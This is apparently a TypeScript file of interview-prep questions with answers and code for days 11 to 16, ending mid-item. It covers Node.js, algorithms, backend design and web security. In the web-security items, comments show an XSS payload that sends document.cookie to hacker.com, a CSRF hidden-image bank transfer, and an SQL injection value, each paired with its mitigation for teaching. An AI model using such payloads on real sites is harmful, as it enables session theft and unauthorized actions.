import { InterviewQuestion } from "../../types";

export function getDayQuestionsP2(dayNum: number): InterviewQuestion[] {
  switch (dayNum) {
    case 11:
      return [
        {
          id: "lf-p11-1",
          q: "What is an event emitter in Node.js?",
          hint: "Core module for handling custom events.",
          answer: "EventEmitter is a class that facilitates communication between objects in Node.js. It allows objects to emit named events that cause registered listener functions to be called.",
          code: "const EventEmitter = require('events');\nconst myEmitter = new EventEmitter();\n\n// Register listener\nmyEmitter.on('userJoined', (name) => {\n  console.log(`Welcome, ${name}!`);\n});\n\n// Trigger event\nmyEmitter.emit('userJoined', 'Alice');",
          category: "Node.js Theory",
          language: "javascript"
        },
        {
          id: "lf-p11-2",
          q: "Explain streams in Node.js.",
          hint: "Handling data piece by piece.",
          answer: "Streams are collections of data that might not be available all at once and don't have to fit in memory. They are used to read/write large files or handle network communications efficiently.",
          code: "const fs = require('fs');\n\n// Read large file piece by piece\nconst readStream = fs.createReadStream('large-file.txt', 'utf8');\n\nreadStream.on('data', (chunk) => {\n  console.log(`Received ${chunk.length} characters of data.`);\n});\n\nreadStream.on('end', () => {\n  console.log('Finished reading file.');\n});",
          category: "Node.js Theory",
          language: "javascript"
        },
        {
          id: "lf-p11-3",
          q: "What is middleware in Express?",
          hint: "Functions that have access to req, res, and next.",
          answer: "Middleware functions execute during the lifecycle of a request to the Express server. They have access to the request object, response object, and the next middleware function. They can modify req/res, end the cycle, or call next().",
          code: "const express = require('express');\nconst app = express();\n\n// Custom middleware\nconst logger = (req, res, next) => {\n  console.log(`${req.method} ${req.url}`);\n  next(); // Pass control to next handler\n};\n\napp.use(logger);\n\napp.get('/', (req, res) => res.send('Hello'));",
          category: "Node.js Theory",
          language: "javascript"
        },
        {
          id: "lf-p11-4",
          q: "Reverse an integer: Strategy?",
          hint: "Handle negative numbers and overflow.",
          answer: "Extract the sign, convert to string, reverse, convert back to integer, reapply sign. Check for 32-bit integer overflow.",
          code: "function reverse(x) {\n  const sign = x < 0 ? -1 : 1;\n  const reversed = parseInt(Math.abs(x).toString().split('').reverse().join('')) * sign;\n  if (reversed < Math.pow(-2, 31) || reversed > Math.pow(2, 31) - 1) return 0;\n  return reversed;\n}\nconsole.log(reverse(123)); // 321\nconsole.log(reverse(-123)); // -321",
          category: "DSA",
          language: "javascript"
        },
        {
          id: "lf-p11-5",
          q: "Palindrome Number: Strategy without string conversion?",
          hint: "Reverse half the number mathematically.",
          answer: "If negative, false. If ends in 0 (and isn't 0), false. Repeatedly extract the last digit (x % 10) and build a reversed number (reversed * 10 + digit). Stop when reversed >= x.",
          code: "function isPalindrome(x) {\n  if (x < 0 || (x % 10 === 0 && x !== 0)) return false;\n  let reversedHalf = 0;\n  while (x > reversedHalf) {\n    reversedHalf = reversedHalf * 10 + x % 10;\n    x = Math.floor(x / 10);\n  }\n  return x === reversedHalf || x === Math.floor(reversedHalf / 10);\n}\nconsole.log(isPalindrome(121)); // true",
          category: "DSA",
          language: "javascript"
        },
        {
          id: "lf-p11-6",
          q: "What is `package-lock.json`?",
          hint: "Locks dependency tree versions.",
          answer: "It describes the exact dependency tree that was installed, ensuring identical installations across different environments and team members.",
          code: "// Example scenario:\n// package.json says: \"express\": \"^4.17.1\"\n// This allows installing 4.18.0 if available.\n// package-lock.json says: exact version is \"4.17.3\" and specifies its sub-dependencies.\n// 'npm ci' strictly uses package-lock.json to install dependencies.",
          category: "Node.js Theory",
          language: "javascript"
        },
        {
          id: "lf-p11-7",
          q: "Difference between `require()` and `import`?",
          hint: "CommonJS vs ES Modules.",
          answer: "`require()` is CommonJS, synchronous, and evaluates dynamically. `import` is ES Modules (ESM), asynchronous, evaluates statically, and supports tree-shaking.",
          code: "// CommonJS (older Node.js standard)\nconst fs = require('fs');\nmodule.exports = function() {};\n\n// ES Modules (Modern JS standard)\nimport fs from 'fs';\nexport function doSomething() {}\n// Note: To use ESM in Node, add \"type\": \"module\" in package.json",
          category: "Node.js Theory",
          language: "javascript"
        },
        {
          id: "lf-p11-8",
          q: "Merge Intervals: Strategy?",
          hint: "Sort by start time, then merge overlapping.",
          answer: "First, sort intervals by start time. Iterate: if current start <= previous end, merge by updating previous end to `Math.max(prevEnd, currEnd)`. Else, add current to results.",
          code: "function merge(intervals) {\n  if (!intervals.length) return [];\n  intervals.sort((a, b) => a[0] - b[0]);\n  const res = [intervals[0]];\n  for (let i = 1; i < intervals.length; i++) {\n    const last = res[res.length - 1];\n    if (intervals[i][0] <= last[1]) {\n      last[1] = Math.max(last[1], intervals[i][1]);\n    } else {\n      res.push(intervals[i]);\n    }\n  }\n  return res;\n}\nconsole.log(merge([[1,3],[2,6],[8,10],[15,18]])); // [[1,6],[8,10],[15,18]]",
          category: "DSA",
          language: "javascript"
        },
        {
          id: "lf-p11-9",
          q: "Insert Interval: Strategy?",
          hint: "Add before, merge overlapping, add after.",
          answer: "Three phases: 1) add all intervals ending before newInterval starts. 2) merge all intervals overlapping with newInterval. 3) add remaining intervals.",
          code: "function insert(intervals, newInterval) {\n  const res = [];\n  let i = 0, n = intervals.length;\n  // 1. Add intervals ending before newInterval\n  while (i < n && intervals[i][1] < newInterval[0]) res.push(intervals[i++]);\n  // 2. Merge overlapping intervals\n  while (i < n && intervals[i][0] <= newInterval[1]) {\n    newInterval[0] = Math.min(newInterval[0], intervals[i][0]);\n    newInterval[1] = Math.max(newInterval[1], intervals[i][1]);\n    i++;\n  }\n  res.push(newInterval);\n  // 3. Add remaining\n  while (i < n) res.push(intervals[i++]);\n  return res;\n}",
          category: "DSA",
          language: "javascript"
        },
        {
          id: "lf-p11-10",
          q: "What does `process.nextTick()` do?",
          hint: "Schedules callback before next Event Loop phase.",
          answer: "It defers the execution of an action until the current operation completes, but BEFORE the Event Loop continues to the next phase (even before Promises/microtasks in older Node versions).",
          code: "console.log('1');\n\nprocess.nextTick(() => {\n  console.log('3 - nextTick');\n});\n\nPromise.resolve().then(() => {\n  console.log('4 - promise');\n});\n\nconsole.log('2');\n// Output in Node: 1, 2, 3, 4\n// (nextTick executes before microtask queue)",
          category: "Node.js Theory",
          language: "javascript"
        }
      ];
    case 12:
      return [
        {
          id: "lf-p12-1",
          q: "What is CORS?",
          hint: "Cross-Origin Resource Sharing.",
          answer: "CORS is a security mechanism enforced by browsers that restricts web pages from making requests to a different domain than the one that served the web page, unless the server explicitly allows it.",
          code: "// In Express, enabling CORS:\nconst cors = require('cors');\nconst express = require('express');\nconst app = express();\n\n// Allow all origins (basic)\napp.use(cors());\n\n// Or configure specific origins:\n// app.use(cors({ origin: 'http://my-frontend.com' }));",
          category: "Web Security",
          language: "javascript"
        },
        {
          id: "lf-p12-2",
          q: "What is JWT (JSON Web Token)?",
          hint: "Stateless authentication token.",
          answer: "A standard for securely transmitting information as a JSON object. Used for stateless authentication. It consists of three parts: Header, Payload, and Signature.",
          code: "// Example of creating a JWT (using jsonwebtoken library)\nconst jwt = require('jsonwebtoken');\n\nconst payload = { userId: 123, role: 'admin' };\nconst secretKey = 'my_super_secret';\n\nconst token = jwt.sign(payload, secretKey, { expiresIn: '1h' });\nconsole.log(token); // e.g. eyJhbGci... (Header.Payload.Signature)",
          category: "Web Security",
          language: "javascript"
        },
        {
          id: "lf-p12-3",
          q: "Where should you store a JWT on the client?",
          hint: "HttpOnly cookies vs LocalStorage.",
          answer: "HttpOnly cookies are safest against XSS because JS can't read them. LocalStorage is vulnerable to XSS. If using LocalStorage, you must heavily sanitize all inputs.",
          code: "// Setting an HttpOnly cookie in Express:\nres.cookie('token', jwtToken, {\n  httpOnly: true,\n  secure: process.env.NODE_ENV === 'production', // HTTPS only in prod\n  sameSite: 'strict', // Protects against CSRF\n  maxAge: 3600000 // 1 hour\n});",
          category: "Web Security",
          language: "javascript"
        },
        {
          id: "lf-p12-4",
          q: "Symmetric vs Asymmetric Encryption?",
          hint: "One key vs Two keys.",
          answer: "Symmetric uses the SAME key to encrypt and decrypt (fast, e.g., AES). Asymmetric uses a Public key to encrypt and a Private key to decrypt (secure for key exchange, e.g., RSA).",
          code: "// Conceptual Example:\n\n// Symmetric (AES)\n// const encrypted = encrypt('data', 'sharedSecret');\n// const decrypted = decrypt(encrypted, 'sharedSecret');\n\n// Asymmetric (RSA)\n// const encrypted = encrypt('data', publicKey);\n// const decrypted = decrypt(encrypted, privateKey);",
          category: "Computer Science",
          language: "javascript"
        },
        {
          id: "lf-p12-5",
          q: "What is hashing and how does it differ from encryption?",
          hint: "One-way vs Two-way.",
          answer: "Hashing is a one-way mathematical function (e.g., bcrypt, SHA-256) used for verifying data integrity (passwords). Encryption is two-way and reversible if you have the key.",
          code: "const bcrypt = require('bcrypt');\n\nasync function hashPassword(plainText) {\n  const saltRounds = 10;\n  const hash = await bcrypt.hash(plainText, saltRounds);\n  return hash;\n}\n\nasync function checkPassword(plainText, hash) {\n  const match = await bcrypt.compare(plainText, hash);\n  return match;\n}",
          category: "Web Security",
          language: "javascript"
        },
        {
          id: "lf-p12-6",
          q: "Find Minimum in Rotated Sorted Array: Strategy?",
          hint: "Binary Search comparing mid to right.",
          answer: "Use Binary Search. Compare `mid` element with `right` element. If `mid > right`, the minimum is in the right half. Else, the minimum is in the left half (including mid).",
          code: "function findMin(nums) {\n  let left = 0, right = nums.length - 1;\n  while (left < right) {\n    const mid = Math.floor((left + right) / 2);\n    if (nums[mid] > nums[right]) {\n      left = mid + 1; // min must be to the right\n    } else {\n      right = mid; // min is mid or to the left\n    }\n  }\n  return nums[left];\n}\nconsole.log(findMin([3,4,5,1,2])); // 1",
          category: "DSA",
          language: "javascript"
        },
        {
          id: "lf-p12-7",
          q: "Search in Rotated Sorted Array: Strategy?",
          hint: "Find sorted half, check if target is inside.",
          answer: "Binary Search. Determine which half is normally sorted. If target falls within the sorted half's range, search there. Otherwise, search the other half.",
          code: "function search(nums, target) {\n  let left = 0, right = nums.length - 1;\n  while (left <= right) {\n    const mid = Math.floor((left + right) / 2);\n    if (nums[mid] === target) return mid;\n    // Left half is sorted\n    if (nums[left] <= nums[mid]) {\n      if (target >= nums[left] && target < nums[mid]) right = mid - 1;\n      else left = mid + 1;\n    } \n    // Right half is sorted\n    else {\n      if (target > nums[mid] && target <= nums[right]) left = mid + 1;\n      else right = mid - 1;\n    }\n  }\n  return -1;\n}",
          category: "DSA",
          language: "javascript"
        },
        {
          id: "lf-p12-8",
          q: "What is XSS (Cross-Site Scripting)?",
          hint: "Injecting malicious scripts into web pages.",
          answer: "A vulnerability where an attacker injects malicious client-side scripts into a trusted site. Prevented by sanitizing input and escaping output (e.g., using `textContent` instead of `innerHTML`).",
          code: "// XSS Attack Example:\n// User inputs: \"<script>fetch('http://hacker.com/?cookie=' + document.cookie)</script>\"\n\n// Bad (Vulnerable):\n// document.getElementById('comment').innerHTML = userInput;\n\n// Good (Safe):\n// document.getElementById('comment').textContent = userInput;",
          category: "Web Security",
          language: "javascript"
        },
        {
          id: "lf-p12-9",
          q: "What is CSRF (Cross-Site Request Forgery)?",
          hint: "Tricking user's browser into making unwanted requests.",
          answer: "An attack that forces an authenticated user to execute unwanted actions on a web application. Prevented by using anti-CSRF tokens or `SameSite` cookie attributes.",
          code: "// CSRF Attack Example:\n// Hacker puts an invisible image on their site:\n// <img src=\"http://bank.com/transfer?to=hacker&amount=1000\" />\n// If you are logged into bank.com, your browser automatically sends your cookies!\n\n// Mitigation:\n// 1. SameSite cookie attribute (Strict or Lax)\n// 2. Anti-CSRF tokens required in POST request bodies or headers.",
          category: "Web Security",
          language: "javascript"
        },
        {
          id: "lf-p12-10",
          q: "What is SQL Injection?",
          hint: "Manipulating queries via unsanitized input.",
          answer: "An attacker inserts malicious SQL statements into entry fields for execution. Prevented by using parameterized queries (Prepared Statements) or ORMs.",
          code: "// DANGEROUS (Vulnerable to SQLi):\n// const id = \"1 OR 1=1\";\n// db.query(`SELECT * FROM users WHERE id = ${id}`);\n\n// SAFE (Parameterized Query):\n// const id = 1;\n// db.query('SELECT * FROM users WHERE id = $1', [id]);",
          category: "Web Security",
          language: "javascript"
        }
      ];
    case 13:
      return [
        {
          id: "lf-p13-1",
          q: "Climbing Stairs: Strategy?",
          hint: "Fibonacci sequence.",
          answer: "Dynamic Programming. To reach step n, you must step from n-1 or n-2. Thus, `ways(n) = ways(n-1) + ways(n-2)`. Optimize space by only keeping the last two values.",
          code: "function climbStairs(n) {\n  if (n <= 2) return n;\n  let a = 1, b = 2;\n  for (let i = 3; i <= n; i++) {\n    const next = a + b;\n    a = b;\n    b = next;\n  }\n  return b;\n}\nconsole.log(climbStairs(5)); // 8",
          category: "DSA",
          language: "javascript"
        },
        {
          id: "lf-p13-2",
          q: "House Robber: Strategy?",
          hint: "Max of (rob current + rob n-2) or (rob n-1).",
          answer: "You can't rob adjacent houses. For each house, decide: rob it and add to loot from two houses back, OR skip it and keep loot from previous house.",
          code: "function rob(nums) {\n  let prev1 = 0; // max money from n-1 houses\n  let prev2 = 0; // max money from n-2 houses\n  for (const num of nums) {\n    const temp = prev1;\n    prev1 = Math.max(prev2 + num, prev1);\n    prev2 = temp;\n  }\n  return prev1;\n}\nconsole.log(rob([2,7,9,3,1])); // 12 (2+9+1)",
          category: "DSA",
          language: "javascript"
        },
        {
          id: "lf-p13-3",
          q: "What is Dynamic Programming (DP)?",
          hint: "Overlapping subproblems + Optimal substructure.",
          answer: "An optimization technique that solves complex problems by breaking them down into simpler subproblems, solving each once, and storing their solutions (memoization or tabulation).",
          code: "// Fib example (Top-down Memoization)\nfunction fibMemo(n, memo = {}) {\n  if (n in memo) return memo[n];\n  if (n <= 1) return n;\n  memo[n] = fibMemo(n - 1, memo) + fibMemo(n - 2, memo);\n  return memo[n];\n}\n\n// Fib example (Bottom-up Tabulation)\nfunction fibTab(n) {\n  const dp = [0, 1];\n  for (let i = 2; i <= n; i++) dp[i] = dp[i-1] + dp[i-2];\n  return dp[n];\n}",
          category: "Theory",
          language: "javascript"
        },
        {
          id: "lf-p13-4",
          q: "Memoization vs Tabulation?",
          hint: "Top-down vs Bottom-up.",
          answer: "Memoization is Top-Down: start at the goal and recursively solve subproblems, caching results. Tabulation is Bottom-Up: start at the base cases and iteratively build up to the goal.",
          code: "// Memoization (Top-down, recursive)\n// Pros: only calculates needed subproblems\n// Cons: recursion overhead, risk of stack overflow\n\n// Tabulation (Bottom-up, iterative)\n// Pros: fast, no recursion depth issues\n// Cons: computes all subproblems, even if not needed",
          category: "Theory",
          language: "javascript"
        },
        {
          id: "lf-p13-5",
          q: "Coin Change: DP Strategy?",
          hint: "dp array of minimum coins needed.",
          answer: "Create a `dp` array of size `amount + 1` initialized to `Infinity`, with `dp[0] = 0`. For each coin and each amount, `dp[i] = Math.min(dp[i], dp[i - coin] + 1)`.",
          code: "function coinChange(coins, amount) {\n  const dp = new Array(amount + 1).fill(Infinity);\n  dp[0] = 0;\n  for (let i = 1; i <= amount; i++) {\n    for (const coin of coins) {\n      if (i - coin >= 0) {\n        dp[i] = Math.min(dp[i], dp[i - coin] + 1);\n      }\n    }\n  }\n  return dp[amount] === Infinity ? -1 : dp[amount];\n}\nconsole.log(coinChange([1,2,5], 11)); // 3 (5+5+1)",
          category: "DSA",
          language: "javascript"
        },
        {
          id: "lf-p13-6",
          q: "Longest Increasing Subsequence: DP Strategy?",
          hint: "dp array tracking max length ending at i.",
          answer: "Create `dp` array of size `n` initialized to 1. For each `i`, look back at all `j < i`. If `nums[i] > nums[j]`, `dp[i] = Math.max(dp[i], dp[j] + 1)`. Return max of `dp`.",
          code: "function lengthOfLIS(nums) {\n  if (!nums.length) return 0;\n  const dp = new Array(nums.length).fill(1);\n  let maxLIS = 1;\n  for (let i = 1; i < nums.length; i++) {\n    for (let j = 0; j < i; j++) {\n      if (nums[i] > nums[j]) {\n        dp[i] = Math.max(dp[i], dp[j] + 1);\n      }\n    }\n    maxLIS = Math.max(maxLIS, dp[i]);\n  }\n  return maxLIS;\n}",
          category: "DSA",
          language: "javascript"
        },
        {
          id: "lf-p13-7",
          q: "Difference between `map` and `forEach`?",
          hint: "Returns new array vs returns undefined.",
          answer: "`map()` returns a NEW array with transformed elements. `forEach()` returns `undefined` and is used to perform side effects (like mutating an external variable or logging).",
          code: "const nums = [1, 2, 3];\n\n// map: returns a new array\nconst doubled = nums.map(x => x * 2); \nconsole.log(doubled); // [2, 4, 6]\n\n// forEach: for side effects, returns undefined\nlet sum = 0;\nnums.forEach(x => sum += x);\nconsole.log(sum); // 6",
          category: "JS Theory",
          language: "javascript"
        },
        {
          id: "lf-p13-8",
          q: "What is an ORM (Object-Relational Mapping)?",
          hint: "Code mapping to database tables.",
          answer: "A technique/tool that lets you query and manipulate data from a database using an object-oriented paradigm. Examples: TypeORM, Prisma, Mongoose (ODM for NoSQL).",
          code: "// Raw SQL (without ORM):\n// db.query(\"SELECT * FROM users WHERE age > 18\");\n\n// Prisma ORM Example:\n// const adults = await prisma.user.findMany({\n//   where: { age: { gt: 18 } }\n// });",
          category: "Backend Theory",
          language: "javascript"
        },
        {
          id: "lf-p13-9",
          q: "What is a REST API?",
          hint: "Representational State Transfer.",
          answer: "An architectural style for APIs that uses standard HTTP methods (GET, POST, PUT, DELETE), stateless communication, and structured URIs to manipulate resources (like JSON).",
          code: "// RESTful conventions:\n// GET    /users      -> Get all users\n// POST   /users      -> Create a user\n// GET    /users/123  -> Get user 123\n// PUT    /users/123  -> Update user 123 fully\n// PATCH  /users/123  -> Update user 123 partially\n// DELETE /users/123  -> Delete user 123",
          category: "Backend Theory",
          language: "javascript"
        },
        {
          id: "lf-p13-10",
          q: "Difference between PUT and PATCH in REST?",
          hint: "Full vs Partial update.",
          answer: "PUT replaces the entire resource; if a field is omitted, it should be set to null. PATCH applies partial modifications to the resource; omitted fields are left unchanged.",
          code: "// Existing resource: { name: 'Alice', age: 25, city: 'NY' }\n\n// PATCH { age: 26 }\n// Result: { name: 'Alice', age: 26, city: 'NY' } (Partial update)\n\n// PUT { name: 'Alice', age: 26 }\n// Result: { name: 'Alice', age: 26, city: null } (Full replacement)",
          category: "Backend Theory",
          language: "javascript"
        }
      ];
    case 14:
      return [
        {
          id: "lf-p14-1",
          q: "Reverse a Linked List: Recursive Strategy?",
          hint: "Reverse rest, point next to self.",
          answer: "Base case: if head is null or head.next is null, return head. Recursively call on head.next. Then `head.next.next = head` and `head.next = null`.",
          code: "function reverseList(head) {\n  if (head === null || head.next === null) return head;\n  const reversedHead = reverseList(head.next);\n  // Make the next node point back to current node\n  head.next.next = head;\n  // Sever the forward link\n  head.next = null;\n  return reversedHead;\n}",
          category: "DSA",
          language: "javascript"
        },
        {
          id: "lf-p14-2",
          q: "Detect Cycle in Linked List (Floyd's Algorithm)?",
          hint: "Tortoise and Hare.",
          answer: "Use a slow pointer (1 step) and a fast pointer (2 steps). If they ever meet, there is a cycle. If fast reaches null, there is no cycle.",
          code: "function hasCycle(head) {\n  let slow = head;\n  let fast = head;\n  while (fast !== null && fast.next !== null) {\n    slow = slow.next;\n    fast = fast.next.next;\n    if (slow === fast) return true; // They met!\n  }\n  return false; // Fast reached the end\n}",
          category: "DSA",
          language: "javascript"
        },
        {
          id: "lf-p14-3",
          q: "Merge Two Sorted Linked Lists?",
          hint: "Dummy node + iterate.",
          answer: "Create a dummy head. Use a pointer. Compare nodes from both lists, attach the smaller to the pointer, advance the list and pointer. Attach any remaining nodes at the end.",
          code: "function mergeTwoLists(l1, l2) {\n  const dummy = { val: -1, next: null }; // Dummy node\n  let curr = dummy;\n  while (l1 !== null && l2 !== null) {\n    if (l1.val <= l2.val) {\n      curr.next = l1;\n      l1 = l1.next;\n    } else {\n      curr.next = l2;\n      l2 = l2.next;\n    }\n    curr = curr.next;\n  }\n  // Attach remaining elements\n  curr.next = l1 !== null ? l1 : l2;\n  return dummy.next;\n}",
          category: "DSA",
          language: "javascript"
        },
        {
          id: "lf-p14-4",
          q: "Remove Nth Node From End of List?",
          hint: "Fast pointer ahead by N steps.",
          answer: "Use two pointers, dummy node. Move fast pointer N steps ahead. Then move both fast and slow until fast reaches the end. Slow will be just before the target node.",
          code: "function removeNthFromEnd(head, n) {\n  const dummy = { val: 0, next: head };\n  let slow = dummy, fast = dummy;\n  // Move fast n steps ahead\n  for (let i = 0; i <= n; i++) {\n    fast = fast.next;\n  }\n  // Move both until fast reaches the end\n  while (fast !== null) {\n    slow = slow.next;\n    fast = fast.next;\n  }\n  // Skip the nth node\n  slow.next = slow.next.next;\n  return dummy.next;\n}",
          category: "DSA",
          language: "javascript"
        },
        {
          id: "lf-p14-5",
          q: "Find Middle of Linked List?",
          hint: "Fast pointer (2x) and Slow pointer (1x).",
          answer: "Use Tortoise and Hare approach. Slow moves 1 step, fast moves 2 steps. When fast reaches the end, slow is at the middle.",
          code: "function middleNode(head) {\n  let slow = head, fast = head;\n  while (fast !== null && fast.next !== null) {\n    slow = slow.next;\n    fast = fast.next.next;\n  }\n  return slow; // Middle node\n}",
          category: "DSA",
          language: "javascript"
        },
        {
          id: "lf-p14-6",
          q: "What is HTTP status code 401 vs 403?",
          hint: "Authentication vs Authorization.",
          answer: "401 Unauthorized means 'You must log in'. 403 Forbidden means 'You are logged in, but you don't have permission to do this.'",
          code: "// Common HTTP Status Codes:\n// 200 OK - Success\n// 201 Created - Resource created (POST)\n// 400 Bad Request - Client sent invalid data\n// 401 Unauthorized - Need to authenticate\n// 403 Forbidden - Authenticated, but lacks permissions\n// 404 Not Found - Resource doesn't exist\n// 500 Internal Server Error - Server crashed",
          category: "Backend Theory",
          language: "javascript"
        },
        {
          id: "lf-p14-7",
          q: "What is GraphQl?",
          hint: "Query language for APIs.",
          answer: "A query language for APIs that allows clients to request exactly the data they need, no more, no less, from a single endpoint, solving the over-fetching/under-fetching problem of REST.",
          code: "// GraphQL Query Example:\n// query {\n//   user(id: \"123\") {\n//     name\n//     posts { title }\n//   }\n// }\n// Response ONLY contains name and post titles, nothing else.",
          category: "Backend Theory",
          language: "javascript"
        },
        {
          id: "lf-p14-8",
          q: "Microservices vs Monolith?",
          hint: "One codebase vs distributed services.",
          answer: "Monolith builds all features in one codebase and deployment. Microservices break features into independent, deployable services communicating via network (more complex, but scales better).",
          code: "// Monolith:\n// [ User Module | Payment Module | Email Module ] -> One App -> One DB\n\n// Microservices:\n// [ User Service ] -> User DB\n// [ Payment Service ] -> Payment DB\n// They communicate via REST, gRPC, or message queues.",
          category: "System Design",
          language: "javascript"
        },
        {
          id: "lf-p14-9",
          q: "What is a Message Queue?",
          hint: "Async communication between services.",
          answer: "A component used for asynchronous communication between microservices. It decoupling systems, allowing one to send a message without waiting for the receiver to process it immediately (e.g., RabbitMQ, Kafka).",
          code: "// Example Use Case:\n// User uploads a video (Service A).\n// Service A puts a message \"process_video_123\" on the Queue.\n// Service A immediately replies \"Upload successful\" to User.\n// Service B (Video Processor) pulls from Queue and processes it in background.",
          category: "System Design",
          language: "javascript"
        },
        {
          id: "lf-p14-10",
          q: "Stateful vs Stateless applications?",
          hint: "Session memory.",
          answer: "Stateful remembers client data (session) across requests (hard to scale). Stateless treats each request independently, relying on tokens/DB for context (easy to scale horizontally).",
          code: "// Stateful (Session in memory):\n// app.post('/login', (req) => { session[user_id] = true; });\n// app.get('/data', (req) => { if (session[user_id]) return data; });\n// Fails if load balancer sends next request to a different server.\n\n// Stateless (JWT):\n// Validates the JWT embedded in the request headers on ANY server.",
          category: "System Design",
          language: "javascript"
        }
      ];
    case 15:
      return [
        {
          id: "lf-p15-1",
          q: "Invert Binary Tree: Strategy?",
          hint: "Swap children, recurse.",
          answer: "Recursively swap the left and right pointers of every node in the tree.",
          code: "function invertTree(root) {\n  if (root === null) return null;\n  // Swap children\n  const temp = root.left;\n  root.left = root.right;\n  root.right = temp;\n  // Recurse\n  invertTree(root.left);\n  invertTree(root.right);\n  return root;\n}",
          category: "DSA",
          language: "javascript"
        },
        {
          id: "lf-p15-2",
          q: "Maximum Depth of Binary Tree?",
          hint: "1 + max of left and right depths.",
          answer: "Base case: if null return 0. Else, compute max depth of left subtree and right subtree. Return the greater of the two plus 1.",
          code: "function maxDepth(root) {\n  if (root === null) return 0;\n  const leftDepth = maxDepth(root.left);\n  const rightDepth = maxDepth(root.right);\n  return Math.max(leftDepth, rightDepth) + 1;\n}",
          category: "DSA",
          language: "javascript"
        },
        {
          id: "lf-p15-3",
          q: "Same Tree: Strategy?",
          hint: "Recursively check values and structure.",
          answer: "If both null, true. If one null, false. If values differ, false. Else, return `isSameTree(p.left, q.left) && isSameTree(p.right, q.right)`.",
          code: "function isSameTree(p, q) {\n  if (p === null && q === null) return true;\n  if (p === null || q === null) return false;\n  if (p.val !== q.val) return false;\n  return isSameTree(p.left, q.left) && isSameTree(p.right, q.right);\n}",
          category: "DSA",
          language: "javascript"
        },
        {
          id: "lf-p15-4",
          q: "Subtree of Another Tree: Strategy?",
          hint: "Check same tree at every node.",
          answer: "If subtree is null, true. If main tree is null, false. Check if `isSameTree(root, subRoot)`. If not, recurse on `root.left` OR `root.right`.",
          code: "function isSubtree(root, subRoot) {\n  if (!subRoot) return true;\n  if (!root) return false;\n  \n  if (isSameTree(root, subRoot)) return true;\n  \n  return isSubtree(root.left, subRoot) || isSubtree(root.right, subRoot);\n}\n\nfunction isSameTree(p, q) {\n  if (!p && !q) return true;\n  if (!p || !q || p.val !== q.val) return false;\n  return isSameTree(p.left, q.left) && isSameTree(p.right, q.right);\n}",
          category: "DSA",
          language: "javascript"
        },
        {
          id: "lf-p15-5",
          q: "Lowest Common Ancestor of a BST?",
          hint: "Use BST property (values left/right).",
          answer: "If both p and q are smaller than root, LCA is in left subtree. If both are larger, LCA is in right subtree. If they split (one left, one right, or one equals root), root is the LCA.",
          code: "function lowestCommonAncestor(root, p, q) {\n  let curr = root;\n  while (curr !== null) {\n    if (p.val < curr.val && q.val < curr.val) {\n      curr = curr.left;\n    } else if (p.val > curr.val && q.val > curr.val) {\n      curr = curr.right;\n    } else {\n      return curr; // Split occurs here\n    }\n  }\n  return null;\n}",
          category: "DSA",
          language: "javascript"
        },
        {
          id: "lf-p15-6",
          q: "What is a Binary Search Tree (BST)?",
          hint: "Left < Parent < Right.",
          answer: "A binary tree where for every node: all elements in the left subtree are smaller, and all elements in the right subtree are larger.",
          code: "// Definition of a BST Node:\nfunction TreeNode(val, left = null, right = null) {\n  this.val = val;\n  this.left = left;\n  this.right = right;\n}\n// Search in BST (O(log n) average):\nfunction searchBST(root, val) {\n  if (!root || root.val === val) return root;\n  if (val < root.val) return searchBST(root.left, val);\n  return searchBST(root.right, val);\n}",
          category: "Theory",
          language: "javascript"
        },
        {
          id: "lf-p15-7",
          q: "Difference between BFS and DFS in a Tree?",
          hint: "Level by level vs Deep as possible.",
          answer: "Breadth-First Search (BFS) explores level by level using a Queue. Depth-First Search (DFS) goes as deep as possible before backtracking, using a Stack or Recursion.",
          code: "// BFS (Queue)\nfunction bfs(root) {\n  if (!root) return;\n  const queue = [root];\n  while (queue.length > 0) {\n    const node = queue.shift();\n    console.log(node.val);\n    if (node.left) queue.push(node.left);\n    if (node.right) queue.push(node.right);\n  }\n}",
          category: "Theory",
          language: "javascript"
        },
        {
          id: "lf-p15-8",
          q: "Binary Tree Level Order Traversal (BFS)?",
          hint: "Queue with level size tracking.",
          answer: "Use a queue. For each level, determine queue size, shift that many elements out, push their values to a level array, and push their children to the queue.",
          code: "function levelOrder(root) {\n  if (!root) return [];\n  const res = [], queue = [root];\n  while (queue.length > 0) {\n    const levelSize = queue.length;\n    const currentLevel = [];\n    for (let i = 0; i < levelSize; i++) {\n      const node = queue.shift();\n      currentLevel.push(node.val);\n      if (node.left) queue.push(node.left);\n      if (node.right) queue.push(node.right);\n    }\n    res.push(currentLevel);\n  }\n  return res;\n}",
          category: "DSA",
          language: "javascript"
        },
        {
          id: "lf-p15-9",
          q: "Validate Binary Search Tree?",
          hint: "Pass down min and max boundaries.",
          answer: "Use a helper function that takes the node, a min value, and a max value. Root starts at (-Infinity, Infinity). Left child updates max to parent val. Right child updates min to parent val.",
          code: "function isValidBST(root, min = -Infinity, max = Infinity) {\n  if (root === null) return true;\n  if (root.val <= min || root.val >= max) return false;\n  \n  return isValidBST(root.left, min, root.val) && \n         isValidBST(root.right, root.val, max);\n}",
          category: "DSA",
          language: "javascript"
        },
        {
          id: "lf-p15-10",
          q: "Kth Smallest Element in a BST?",
          hint: "Inorder traversal gives sorted order.",
          answer: "Perform an inorder traversal (Left, Root, Right). Keep a counter. When counter equals K, the current node is the Kth smallest element.",
          code: "function kthSmallest(root, k) {\n  let count = 0, result = null;\n  function inorder(node) {\n    if (!node || result !== null) return;\n    inorder(node.left);\n    count++;\n    if (count === k) {\n      result = node.val;\n      return;\n    }\n    inorder(node.right);\n  }\n  inorder(root);\n  return result;\n}",
          category: "DSA",
          language: "javascript"
        }
      ];
    case 16:
      return [
        {
          id: "lf-p16-1",
          q: "How to handle an API failure gracefully in React?",
          hint: "try/catch, set error state, show fallback UI.",
          answer: "Use try/catch in the async fetch function. On catch, set an error state. In the render, if error state exists, show an error message instead of crashing.",
          code: "const [data, setData] = useState(null);\nconst [error, setError] = useState('');\n\nuseEffect(() => {\n  const fetchData = async () => {\n    try {\n      const res = await fetch('/api/data');\n      if (!res.ok) throw new Error('Failed to fetch');\n      setData(await res.json());\n    } catch (err) {\n      setError(err.message);\n    }\n  };\n  fetchData();\n}, []);\n\nif (error) return <div>Error: {error}</div>;\nif (!data) return <div>Loading...</div>;\nreturn <div>{data.name}</div>;",
          category: "React",
          language: "javascript"
        },
        {
          id: "lf-p16-2",
          q: "What is `React.memo`?",
          hint: "HOC for memoizing components.",
          answer: "A higher-order component that prevents functional components from re-rendering if their props have not changed (shallow comparison).",
